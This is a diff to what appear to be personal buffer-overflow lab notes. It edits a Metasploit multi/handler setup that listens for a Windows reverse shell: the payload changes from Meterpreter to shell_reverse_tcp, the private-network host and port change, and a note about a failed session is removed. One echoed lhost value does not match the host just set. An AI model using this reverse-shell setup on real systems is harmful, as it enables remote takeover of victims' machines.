@@ -317,26 +317,17 @@ OR
 ```
 $ msfconsole -q
 msf > use exploit/multi/handler
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
-msf exploit(handler) > set lhost 192.168.1.123
+msf exploit(handler) > set payload windows/shell_reverse_tcp
+payload => windows/shell_reverse_tcp
+msf exploit(handler) > set lhost 192.168.86.57
 lhost => 192.168.1.123
-msf exploit(handler) > set lport 4444
-lport => 4444
+msf exploit(handler) > set lport 1234
+lport => 1234
 msf exploit(handler) > run
 
-[*] Started reverse handler on 192.168.1.123:4444
+[*] Started reverse handler on 192.168.86.57:1234
 [*] Starting the payload handler...
 ```
-==Was not able to capture shell with exploit/multi/handler.==
-==I get the following:==
-```
-*] Meterpreter session 1 opened (192.168.86.57:1234 -> 192.168.86.55:51177) at 2021-03-13 01:17:58 -0800
-dir
-[-] Meterpreter session 1 is not valid and will be closed
-[*] 192.168.86.55 - Meterpreter session 1 closed.
-```
-==Need to dig into this more.==
 
 ## 8-bof-reverse-shell-exploit-nc.py
 ```
